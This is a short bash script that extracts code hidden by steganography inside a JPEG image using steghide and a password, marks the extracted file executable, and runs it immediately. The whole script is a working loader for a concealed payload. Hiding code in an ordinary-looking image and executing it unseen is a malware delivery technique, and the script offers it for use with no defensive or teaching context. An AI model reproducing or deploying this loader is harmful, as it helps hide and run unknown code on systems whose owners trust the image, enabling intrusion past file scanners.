#!/bin/bash

# Define variables
IMAGE_FILE="logo.jpg"   # The JPEG file with the hidden code
OUTPUT_FILE="extracted_code.sh"  # The file where the hidden code will be extracted to
PASSWORD="your_password_here"    # The password used to embed the hidden code

# Extract the hidden code from the image
steghide extract -sf "$IMAGE_FILE" -xf "$OUTPUT_FILE" -p "$PASSWORD"

# Make the extracted file executable
chmod +x "$OUTPUT_FILE"

# Execute the extracted code
./"$OUTPUT_FILE"
